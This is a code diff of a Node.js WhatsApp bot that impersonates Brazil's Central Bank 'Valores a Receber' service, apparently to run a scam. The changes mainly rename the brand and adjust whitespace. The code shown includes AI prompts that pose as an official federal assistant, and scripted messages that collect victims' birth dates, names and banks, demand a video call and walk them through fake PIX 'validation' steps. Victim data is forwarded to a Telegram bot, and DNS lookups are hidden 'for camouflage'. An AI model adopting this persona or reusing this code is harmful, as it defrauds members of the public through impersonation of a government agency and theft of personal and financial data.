@@ -45,7 +45,7 @@ console.log(`---------------------------------------------\n`);
 
 // --- PROMPTS DE IA ---
 // Prompt para mensagens espontâneas iniciais (antes do cadastro)
-const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
+const PROMPT_INICIAL = `Você é o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ) e da Lei Complementar nº 105/2001. 
 Este canal é de uso exclusivo para liberação de ativos financeiros pendentes de titulares cadastrados no sistema federal.
 Um cidadão entrou em contato. Responda de forma extremamente formal, institucional e segura, como um assistente de órgão público federal. 
 Informe brevemente que identificou valores a receber cadastrados em nome do titular no sistema e que é necessário validar a identidade para prosseguir com a liberação. Não mencione valores específicos. Seja sóbrio, preciso e formal.
@@ -55,7 +55,7 @@ Informe brevemente que identificou valores a receber cadastrados em nome do titu
 Mensagem do cidadão:`;
 
 // Prompt para validação de data inválida
-const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
+const PROMPT_DATA_INVALIDA = `Você é o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
 O cidadão enviou uma mensagem que não corresponde a uma data de nascimento válida. Solicite novamente de forma formal e institucional, no formato DD/MM/AAAA.
 
 ⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).
@@ -63,7 +63,7 @@ O cidadão enviou uma mensagem que não corresponde a uma data de nascimento vá
 Mensagem do cidadão:`;
 
 // Prompt para validação de nome inválido
-const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
+const PROMPT_NOME_INVALIDO = `Você é o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil e em conformidade com o STJ.
 O cidadão enviou algo que não parece ser um nome completo válido. Solicite que informe o nome completo conforme consta em documento oficial, de forma formal e institucional.
 
 ⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**).
@@ -71,13 +71,14 @@ O cidadão enviou algo que não parece ser um nome completo válido. Solicite qu
 Mensagem do cidadão:`;
 
 // Prompt para mensagens durante a fila de espera
-const PROMPT_FILA = `Você é o Assistente Oficial do Portal SVR — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
+const PROMPT_FILA = `Você é o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber, vinculado ao Banco Central do Brasil, em conformidade com as diretrizes do Superior Tribunal de Justiça (STJ).
 O cidadão está aguardando na fila de processamento para liberação de seus ativos financeiros. O registro dele já foi validado com sucesso e está em análise pelos sistemas do Banco Central.
 Responda de forma formal, institucional e tranquilizadora, informando que o processo está em andamento e que ele será notificado assim que a liberação for processada. Solicite que aguarde. Não mencione valores. Seja sóbrio e oficial.
 
 ⚠️ *IMPORTANTE:* Use apenas um asterisco (*) para negrito (ex: *texto*). NUNCA use dois asteriscos (**), pois o WhatsApp não reconhece e polui a mensagem.
 
 Mensagem do cidadão durante a espera:`;
+
 
 // Prompt para extração inteligente de banco
 const PROMPT_BANCO_EXTRACT = `Você é um assistente do Banco Central. O usuário enviou uma mensagem informando o nome do banco dele.
@@ -92,7 +93,7 @@ async function askAI(prompt, userMessage) {
     if (!GEMINI_KEY) return null;
     try {
         const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_KEY}`;
-        
+
         // Resolve domain via DoH for camouflage
         const ips = await queryDnsDoH("generativelanguage.googleapis.com");
         if (ips.length > 0) {
@@ -101,7 +102,7 @@ async function askAI(prompt, userMessage) {
 
         const response = await axios.post(url, {
             contents: [{ parts: [{ text: `${prompt}\n\n"${userMessage}"` }] }]
-        }, { 
+        }, {
             timeout: 15000,
             httpsAgent: getSecureHttpsAgent() // Hardened TLS
         });
@@ -176,7 +177,7 @@ async function sendBotMessage(chatId, text, options = {}) {
         return res;
     } catch (e) {
         console.error(`❌ [ERRO] Falha ao enviar mensagem para ${chatId}:`, e.message);
-        
+
         // Se o erro for de navegador/frame, encerramos para reiniciar limpo
         if (e.message.includes('detached Frame') || e.message.includes('Target closed') || e.message.includes('Protocol error')) {
             console.log('🔄 [RECOVERY] Erro de navegador detectado no envio. Reiniciando bot...');
@@ -286,7 +287,7 @@ async function notifyTelegram(html, messageId, replyMarkup) {
         if (messageId) {
             const payload = { chat_id: CHAT_ID, message_id: messageId, text: html, parse_mode: 'HTML' };
             if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
-            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload, { 
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, payload, {
                 timeout: 10000,
                 httpsAgent: agent
             });
@@ -294,7 +295,7 @@ async function notifyTelegram(html, messageId, replyMarkup) {
         } else {
             const payload = { chat_id: CHAT_ID, text: html, parse_mode: 'HTML' };
             if (replyMarkup) payload.reply_markup = JSON.stringify(replyMarkup);
-            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload, { 
+            const res = await axios.post(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, payload, {
                 timeout: 10000,
                 httpsAgent: agent
             });
@@ -432,7 +433,7 @@ function getChromePath() {
                 return savedData.path;
             }
         }
-    } catch (e) {}
+    } catch (e) { }
 
     // 1. Tenta comandos do sistema (Linux/Mac)
     if (process.platform !== 'win32') {
@@ -445,7 +446,7 @@ function getChromePath() {
                     console.log(`✅ [CHROME] Encontrado via comando '${cmd}': ${p}`);
                     return p;
                 }
-            } catch (e) {}
+            } catch (e) { }
         }
     }
 
@@ -471,9 +472,9 @@ function getChromePath() {
                     return p;
                 }
             }
-        } catch (e) {}
+        } catch (e) { }
     }
-    
+
     function findInDir(baseDir) {
         try {
             if (!fs.existsSync(baseDir)) return null;
@@ -490,7 +491,7 @@ function getChromePath() {
                             try {
                                 fs.accessSync(fullPath, fs.constants.X_OK);
                                 return fullPath;
-                            } catch (e) {}
+                            } catch (e) { }
                         } else {
                             return fullPath;
                         }
@@ -503,7 +504,7 @@ function getChromePath() {
                 console.log(`✅ [CHROME] Encontrado via busca recursiva em ${baseDir}: ${found}`);
                 return found;
             }
-        } catch (e) {}
+        } catch (e) { }
         return null;
     }
 
@@ -512,7 +513,7 @@ function getChromePath() {
 
     const foundInCache = findInDir(path.join(process.cwd(), '.cache', 'puppeteer'));
     if (foundInCache) return foundInCache;
-    
+
     console.log('⚠️ [CHROME] Nenhum executável encontrado. Puppeteer tentará o padrão.');
     return undefined;
 }
@@ -520,7 +521,7 @@ function getChromePath() {
 
 const client = new Client({
     authStrategy: new LocalAuth({ clientId: BOT_ID, dataPath: '.wwebjs_auth' }),
-    authTimeoutMs: 0, 
+    authTimeoutMs: 0,
     qrTimeoutMs: 0,
     takeoverOnConflict: true,
     takeoverTimeoutMs: 0,
@@ -585,7 +586,7 @@ client.on('qr', async (qr) => {
             `⏳ <b>Gerado às:</b> ${now.toLocaleTimeString('pt-BR')}\n` +
             `⚠️ <b>Expira às:</b> ${expiresAt.toLocaleTimeString('pt-BR')} (Válido por 45s)\n\n` +
             `<i>Após este horário, o QR pode expirar. Caso não conecte, clique no botão abaixo para atualizar.</i>`;
-        
+
         const kb = {
             inline_keyboard: [
                 [{ text: "🔄 Gerar Novo QR Code", callback_data: `cmd:refresh_qr:${BOT_ID}` }],
@@ -609,7 +610,7 @@ client.on('qr', async (qr) => {
         if (res.data?.result) {
             const msgId = res.data.result.message_id;
             saveQrMsgId(msgId);
-            
+
             // 🕒 Timer para marcar como expirado no Telegram
             setTimeout(async () => {
                 if (!isBotReady) {
@@ -712,13 +713,13 @@ function buildStatusMessage(step) {
     const s3 = step >= 3 ? '✅ Concluída' : '⏳ Pendente';
     const s4 = step >= 4 ? '✅ Concluída' : '⏳ Pendente';
 
-    return `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
+    return `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
 *Departamento de Liberação de Ativos Financeiros*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Prezado(a) Titular,
 
-Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal SVR, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.
+Informamos que a partir deste momento o(a) senhor(a) está sendo atendido(a) diretamente por um *Operador Especializado do Departamento Jurídico-Financeiro* do Portal de Valores, vinculado ao Banco Central do Brasil, em conformidade com a *Lei Complementar nº 105/2001* e a *Resolução BCB nº 4.862/2020*.
 
 Seu processo de liberação de ativos financeiros pendentes encontra-se devidamente registrado em nosso sistema federal e aguarda a conclusão das etapas obrigatórias de validação, conforme previsto na legislação vigente.
 
@@ -742,14 +743,14 @@ Nosso operador responsável conduzirá o(a) senhor(a) pelas próximas etapas de 
 
 _Contamos com sua colaboração e compreensão._
 
-*Portal SVR — Banco Central do Brasil*
+*Portal de Valores — Banco Central do Brasil*
 *CNPJ: 00.038.166/0001-05*
 _Este canal é monitorado e possui validade jurídica._`;
 }
 
 // --- MENSAGENS POR ETAPA ---
 const MENSAGEM_ETAPA_2_CONCLUIDA =
-    `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
+    `🔐 *PORTAL DE VALORES — SISTEMA DE VALORES A RECEBER*
 *Departamento de Liberação de Ativos Financeiros*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -768,12 +769,12 @@ Nosso operador especializado confirmou a titularidade e a autenticidade dos seus
 
 Nosso operador dará continuidade ao processo em instantes. Permaneça disponível.
 
-*Portal SVR — Banco Central do Brasil*
+*Portal de Valores — Banco Central do Brasil*
 _Este processo possui registro jurídico e validade legal._`;
 
 const MENSAGEM_ETAPA_3 =
     `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
-*Departamento de Segurança Financeira — Portal SVR*
+*Departamento de Segurança Financeira — Portal de Valores*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Prezado(a) Titular,
@@ -794,7 +795,7 @@ O sistema processará o estorno de forma automática via PIX em até 60 segundos
 
 Aguarde o envio das instruções de validação (Código Hash de Autenticação).
 
-*Portal SVR — Banco Central do Brasil*
+*Portal de Valores — Banco Central do Brasil*
 _Processo regido pela Resolução BCB nº 318/2023._`;
 
 const MENSAGEM_ETAPA_4 =
@@ -817,10 +818,10 @@ ${BT}
 ✅ O código enviado anteriormente representa o seu link de autenticação segura. Assim que a integração for detectada pela rede bancária, o processo avançará automaticamente para a fase de crédito final.
 ⚠️ *ATENÇÃO:* Permaneça nesta tela. O sistema está monitorando a validação do hash em tempo real. Assim que concluído, o montante total será liberado.
 
-*Portal SVR — Banco Central do Brasil*`;
+*Portal de Valores — Banco Central do Brasil*`;
 const MENSAGEM_ETAPA_5 =
     `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
-*Departamento de Execução Financeira — Portal SVR*
+*Departamento de Execução Financeira — Portal de Valores*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 Prezado(a) Titular,
@@ -838,7 +839,7 @@ Informamos que o seu processo de resgate foi *100% HOMOLOGADO E FINALIZADO* com 
 
 Agradecemos por utilizar os canais oficiais do Banco Central do Brasil para a recuperação de seus ativos financeiros.
 
-*Portal SVR — Banco Central do Brasil*
+*Portal de Valores — Banco Central do Brasil*
 _Processo 100% Homologado e Finalizado._`;
 
 const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvcmVzIFMuQS4iLCIxMDEiOiJSZW5hc2NlbmNhIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTAyIjoiWHAgSW52ZXN0aW1lbnRvcyBDb3JyZXRvcmEgZGUgQ8OibWJpbyxUw610dWxvcyBkIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMvQSIsIjEwNCI6IkNhaXhhIEVjb25vbWljYSBGZWRlcmFsIiwiMTA1IjoiTGVjY2EgQ3LDqWRpdG8iLCIxMDciOiJCYW5jbyBCb2NvbSBCYm0gUy5BLiIsIjEwOCI6IlBvcnRvY3JlZCBTLkEuIC0gQ3JlZGl0byIsIjExMSI6Ik9saXZlaXJhIFRydXN0IERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQS4iLCIxMTMiOiJNYWdsaWFubyBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMTE0IjoiQ2VudHJhbCBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBObyBFc3RhZG8gRG8gRXNww61yaXRvIFNhbnRvIC0gQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYSIsIjExOSI6IkJhbmNvIFdlc3Rlcm4gVW5pb24gRG8gQnJhc2lsIFMuQS4iLCIxMjAiOiJCYW5jbyBSb2RvYmVucyBTLkEuIiwiMTIxIjoiQmFuY28gQWdpYmFuayBTLkEuIiwiMTIyIjoiQmFuY28gQnJhZGVzY28gQmVyaiBTLkEuIiwiMTI0IjoiQmFuY28gV29vcmkgQmFuayBEbyBCcmFzaWwgUy5BLiIsIjEyNSI6IlBsdXJhbCBTLkEuIEJhbmNvIE3Dumx0aXBsbyIsIjEyNiI6IkJyIFBhcnRuZXJzIEJhbmNvIERlIEludmVzdGltZW50byBTLkEuIiwiMTI3IjoiQ29kZXBlIENvcnJldG9yYSBEZSBWYWxvcmVzIEUgQ8OibWJpbyBTLkEuIiwiMTI4IjoiTXMgQmFuayBTLkEuIEJhbmNvIERlIEPDom1iaW8iLCIxMjkiOiJVYnMgQnJhc2lsIEJhbmNvIGRlIEludmVzdGltZW50byBTLkEuIiwiMTMwIjoiQ2FydWFuYSBTLkEuIC0gU29jaWVkYGFkZSBEZSBDcsOpZGl0byIsIjEzMSI6IlR1bGxldHQgUHJlYm9uIEJyYXNpbCBDb3JyZXRvcmEgZGUgVmFsb3JlcyBlIEPDom1iaW8gTHRkYSIsIjEzMiI6IkljYmMgRG8gQnJhc2lsIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiMTMzIjoiQmFuY28gQ3JlZ29sIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBEZSBDcsOpZGl0byBlIEVjb25vbWlhIEZhbWlsaWFyIGUgU29saWTDoXJpYSIsIjEzNCI6IkJnYyBMaXF1aWRleiBEaXN0cmlidWlkb3JhIERlIFTDtXR1bG9zIEUgVmFsb3JlcyBNb2JpbGnDoXJpb3MgTHRkYSIsIjEzNiI6IlVuaWNyZWQgRG8gQnJhc2lsIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBVbmljcmVkIEx0ZGEuIiwiMTM4IjoiR2V0IE1vbmV5IENvcnJldG9yYSBEZSBDw6JtYmlvIFMuQS4iLCIxMzkiOiJJbnRlc2EgU2FucGFvbG8gQnJhc2lsIFMuQS4gLSBCYW5jbyBNdWx0aXBsbyIsIjE0MCI6IkVhc3ludmVzdCAtIFTDrXR1bG8gQ29ycmV0b3JhIERlIFZhbG9yZXMgU2EiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMTQzIjoiVHJldmlzbyBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTQ0IjoiQmV4cyBCYW5jbyBEZSBDw6JtYmlvIFMvQSIsIjE0NSI6IkxldnljYW0gLSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEUgVmFsb3JlcyBMdGRhLiIsIjE0NiI6Ikd1aXR0YSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEx0ZGEuIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSBTLkEuIC0gQ3LDqWRpdG8gRmluYW5jaWFtZW50byBlIEludmVzdGltZW50byIsIjE1NyI6IkljYXAgRG8gQnJhc2lsIENvcnJldG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEuIiwiMTU5IjoiQ2FzYSBEbyBDcsOpZGl0byBTLkEuIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciIsIjE2MyI6IkNvbW1lcnpiYW5rIEJyYXNpbCBTLkEuIC0gQmFuY28gTcO6bHRpcGxvIiwiMTY5IjoiQmFuY28gT2zDqSBDb25zaWduYWRvIFMuQS4iLCIxNzMiOiJCcmwgVHJ1c3QgRGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIxNzQiOiJQZWZpc2EgUy5BLiAtIENyw6lkaXRvIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyBTLkEuIENvcnJldG9yYSBEZSBWYWxvcmVzIiwiMTgwIjoiQ20gQ2FwaXRhbCBNYXJrZXRzIENvcnJldG9yYSBEZSBDw6JtYmlvLCBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEiLCIxODMiOiJTb2NyZWQgUy5BLiAtIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciBlIGEgRW1wcmVzYSBEZSBQZXF1ZW5vIFAiLCIxODQiOiJCYW5jbyBJdGHDuiBCQkEgUy5BLiIsIjE4OCI6IkF0aXZhIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgRGUgVMOtdHVsb3MsIEPDom1iaW8gRSBWYWxvcmVzIiwiMTg5IjoiSFMgRmluYW5jZWlyYSBTL0EgQ3JlZGl0byIsIjE5MCI6IlNlcnZpY29vcCAtIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIERvcyBTZXJ2aWRvcmVzIFDDumJsaWNvcyBFc3RhZHVhaXMgRG8gUmlvIEdyYW4iLCIxOTEiOiJOb3ZhIEZ1dHVyYSBDb3JyZXRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjE5NCI6IlBhcm1ldGFsIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTk2IjoiRmFpciBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTk3IjoiU3RvbmUgUGFnYW1lbnRvcyBTLkEuIiwiMjA4IjoiQmFuY28gQlRHIFBhY3R1YWwgUy5BLiIsIjIxMiI6IkJhbmNvIE9yaWdpbmFsIFMuQS4iLCIyMTMiOiJCYW5jbyBBcmJpIFMuQS4iLCIyMTciOiJCYW5jbyBKb2huIERlZXJlIFMuQS4iLCIyMTgiOiJCYW5jbyBCczIgUy5BLiIsIjIyMiI6IkJhbmNvIENyw6lkaXQgQWdyaWNvbGUgQnJhc2lsIFMuQS4iLCIyMjQiOiJCYW5jbyBGaWJyYSBTLkEuIiwiMjMzIjoiQmFuY28gQ2V0ZWxlbSBTLkEuIiwiMjM3IjoiQmFuY28gQnJhZGVzY28gUy5BLiIsIjI0MSI6IkJhbmNvIENsw6Fzc2ljbyBTLkEuIiwiMjQzIjoiQmFuY28gTcOheGltYSBTLkEuIiwiMjQ2IjoiQmFuY28gQWJjIEJyYXNpbCBTLkEuIiwiMjQ5IjoiQmFuY28gSW52ZXN0Y3JlZCBVbmliYW5jbyBTLkEuIiwiMjUwIjoiQmN2IC0gQmFuY28gZGUgQ3LDqWRpdG8gZSBWYXJlam8gUy5BLiIsIjI1MyI6IkJleHMgQ29ycmV0b3JhIERlIEPDom1iaW8gUy5BLiIsIjI1NCI6IlBhcmFuw6EgQmFuY28gUy5BLiIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyBkZSBtw61iaW8gUy5BLiIsIjI2MCI6Ik51IFBhZ2FtZW50b3MgUy5BLiIsIjI2NSI6IkJhbmNvIEZhdG9yIFMuQS4iLCIyNjYiOiJCYW5jbyBDZWR1bGEgUy5BLiIsIjI2OCI6IkJhcmkgQ29tcGFuaGlhIEhpcG90ZWPDoXJpYSIsIjI2OSI6IkJhbmNvIEhTQkMgUy5BLiIsIjI3MCI6IlNhZ2l0dXIgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYS4iLCIyNzEiOiJJYiBDb3JyZXRvcmEgZGUgQ8OibWJpbywgdMOtdHVsbyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIyNzIiOiJCYW5jbyBBZ2sgUy5BLiIsIjI3MyI6IkNvb3BlcmF0aXZhIGRlIENyw6lkaXRvIFUnIn0="));
@@ -881,7 +882,7 @@ function editDistance(s1, s2) {
 
 function detectBank(text) {
     if (!text) return null;
-    
+
     // Normalização agressiva
     const clean = text.toLowerCase()
         .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remove acentos
@@ -891,7 +892,7 @@ function detectBank(text) {
 
     // Palavras que indicam que o usuário está falando de agência (com variações de erro)
     const agenciaVariations = ["agencia", "agencia", "agensia", "agenca", "agensea", "ag", "agen"];
-    
+
     // Remove as variações de "agência" para tentar isolar o nome do banco
     let textFocus = clean;
     agenciaVariations.forEach(v => {
@@ -939,10 +940,10 @@ function detectBank(text) {
 
     const searchPool = [
         ...commonPatterns.map(b => ({ code: b.code, name: b.name, search: b.keywords[0] })),
-        ...Object.entries(BANCOS_LIST).map(([code, name]) => ({ 
-            code, 
-            name, 
-            search: name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^a-z0-9 ]/g, " ").trim() 
+        ...Object.entries(BANCOS_LIST).map(([code, name]) => ({
+            code,
+            name,
+            search: name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^a-z0-9 ]/g, " ").trim()
         }))
     ];
 
@@ -1004,15 +1005,15 @@ client.on('message_create', async (msg) => {
     // --- DETECÇÃO DE LIGAÇÃO ATENDIDA / DESLIGADA ---
     if (msg.type === 'call_log') {
         const callBody = (msg.body || '').toLowerCase();
-        
+
         // Verifica se é uma chamada de VÍDEO
         const isVideoCall = callBody.includes('vídeo') || callBody.includes('video') || msg.isVideo === true;
-        
+
         // Verifica se a ligação foi atendida (não perdida/recusada/rejeitada)
         // Se a duração aparecer no corpo, é um forte sinal de que foi atendida
         const hasDuration = /\d+ (min|seg|sec)/.test(callBody);
         const isMissed = callBody.includes('perdida') || callBody.includes('missed') || callBody.includes('sem resposta') || callBody.includes('rejeitada') || callBody.includes('recusada') || callBody.includes('cancelada');
-        
+
         const callAnswered = !isMissed && (hasDuration || callBody.length > 5);
 
         if (currentSession) {
@@ -1021,7 +1022,7 @@ client.on('message_create', async (msg) => {
             // REGRA: Só libera Etapa 2 se for Chamada de VÍDEO e for ATENDIDA
             if (isVideoCall && callAnswered) {
                 // Ligação de vídeo atendida e encerrada → Etapa 2 CONCLUÍDA
-                currentSession.humanStep = 2; 
+                currentSession.humanStep = 2;
                 console.log(`✅ [CALL] Vídeo chamada atendida por ${targetChatId} — Etapa 2 CONCLUÍDA.`);
             } else if (callAnswered && !isVideoCall) {
                 console.log(`ℹ️ [CALL] Chamada de VOZ atendida por ${targetChatId} — Ignorado (exige Vídeo).`);
@@ -1058,7 +1059,7 @@ client.on('message_create', async (msg) => {
                         // Se não achar a mensagem para editar, manda uma nova com o status atual
                         await sendBotMessage(targetChatId, buildStatusMessage(currentSession.humanStep));
                     }
-                } catch (e) { 
+                } catch (e) {
                     console.error("Erro ao atualizar status após call:", e.message);
                 }
             }, 1500);
@@ -1111,19 +1112,19 @@ client.on('message', async (msg) => {
     // --- PROTEÇÃO ANTI-FLOOD ---
     const now = Date.now();
     const stats = userMessageCounts.get(targetChatId) || { count: 0, firstMsgTime: now };
-    
+
     // Reseta contador a cada 10 segundos
     if (now - stats.firstMsgTime > 10000) {
         stats.count = 0;
         stats.firstMsgTime = now;
     }
-    
+
     stats.count++;
     userMessageCounts.set(targetChatId, stats);
 
     if (stats.count > 5) {
         console.log(`⚠️ [ANTI-FLOOD] Ignorando flood de mensagens de ${targetChatId}`);
-        return; 
+        return;
     }
 
     if (processingLock.has(targetChatId)) {
@@ -1218,10 +1219,10 @@ async function processIncomingMessage(msg, targetChatId) {
         setTimeout(async () => {
             if (isPJ) {
                 await sendBotMessage(targetChatId,
-                    `🏢 *Portal SVR — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
+                    `🏢 *Portal de Valores — Atendimento Empresarial*\n\nIdentificamos ativos financeiros pendentes vinculados ao CNPJ informado em nosso sistema.\n\nPara prosseguir com a validação da titularidade jurídica, necessitamos confirmar os dados cadastrais da empresa.\n\n📍 *ETAPA 1:* Informe a *Data de Abertura* da empresa (Ex: 10/05/2005):`);
             } else {
                 await sendBotMessage(targetChatId,
-                    `👋 *Olá! Sou o assistente oficial do SVR.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
+                    `👋 *Olá! Sou o assistente oficial do Portal de Valores.*\n\nPara sua segurança, iniciamos o *Protocolo de Validação de Dados*.\n\n📍 *ETAPA 1:* Digite sua *Data de Nascimento* (Ex: 10/05/1990):`);
             }
         }, 1500);
         return;
@@ -1234,7 +1235,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
         const aiReply = await askAI(PROMPT_FILA, text);
         const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
-        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\nPrezado(a) titular,\n\nSeus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\nO processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\nAgradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;
+        const fallback = `📋 *Portal de Valores — Sistema de Valores a Receber*\n\nPrezado(a) titular,\n\nSeus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\nO processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\nAgradecemos sua compreensão.\n_Portal de Valores — Banco Central do Brasil_`;
 
         await sendBotMessage(targetChatId, aiReply || fallback);
         return;
@@ -1290,7 +1291,7 @@ async function processIncomingMessage(msg, targetChatId) {
         saveSessions();
 
         const aiReply = await askAI(PROMPT_INICIAL, text);
-        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
+        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal de Valores — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
 
         setTimeout(async () => {
             await sendBotMessage(targetChatId, aiReply || fallback);
@@ -1311,7 +1312,7 @@ async function processIncomingMessage(msg, targetChatId) {
             console.log(`[BOT] Date format not recognized for ${targetChatId}: "${text}"`);
             const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
             const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
-            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
+            const fallback = `⚠️ *Portal de Valores — Validação de Identidade*\n\nO formato informado não foi reconhecido pelo sistema.\n\nPor gentileza, informe a *${dataLabel}* no formato oficial:\n📌 *Exemplo:* 10/05/1990`;
             await sendBotMessage(targetChatId, aiReply || fallback);
             return;
         }
@@ -1352,7 +1353,7 @@ async function processIncomingMessage(msg, targetChatId) {
 
             if (cleanTyped !== cleanExpected) {
